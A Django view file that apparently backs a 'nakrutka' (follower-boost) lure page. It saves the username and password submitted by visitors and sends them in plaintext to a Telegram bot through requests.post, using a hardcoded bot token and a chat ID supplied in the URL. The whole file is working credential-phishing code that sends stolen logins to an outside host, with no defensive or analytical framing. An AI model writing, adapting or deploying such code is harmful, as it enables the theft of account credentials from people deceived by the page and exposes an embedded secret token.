import requests
from django.http import HttpResponse
from django.shortcuts import render
from .forms import NakrutkaForm

def home(request,id):
    success = False
    if request.method == "POST":
        form = NakrutkaForm(request.POST)
        if form.is_valid():
            obj = form.save()
            username_var = form.cleaned_data.get('username')
            password_var = form.cleaned_data.get('password')
            bot_token = "8001673640:AAGeOTbzy-asikrePuBu_5ANRsEiqVn6nq8"
            text = f"👤 *Login*: ```{username_var}```\n🔒 *Parol*: ```{password_var}```\n"
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                          data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})

    else:
        form = NakrutkaForm()

    return render(request, "index.html", {"form": form, "success": success})
